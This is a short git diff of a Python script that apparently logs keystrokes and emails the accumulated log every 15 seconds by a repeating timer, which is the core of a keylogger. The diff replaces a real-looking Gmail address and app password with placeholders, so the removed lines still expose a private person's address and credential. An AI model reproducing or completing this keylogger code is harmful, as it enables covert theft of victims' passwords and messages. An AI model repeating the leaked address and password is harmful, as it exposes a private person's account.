@@ -4,8 +4,8 @@ import threading
 
 log = ""
 
-EMAIL = "karthikajaagu@gmail.com"
-PASSWORD = "ulsd ywud lpvt sqzp"
+EMAIL = "email@gmail.com"
+PASSWORD = "password"
 
 def write_to_file(key):
     global log
@@ -41,7 +41,7 @@ def send_email():
         log = ""
     # Schedule next email
     threading.Timer(15, send_email).start()
-    
+
 # Start sending emails every 15 seconds
 send_email()
 
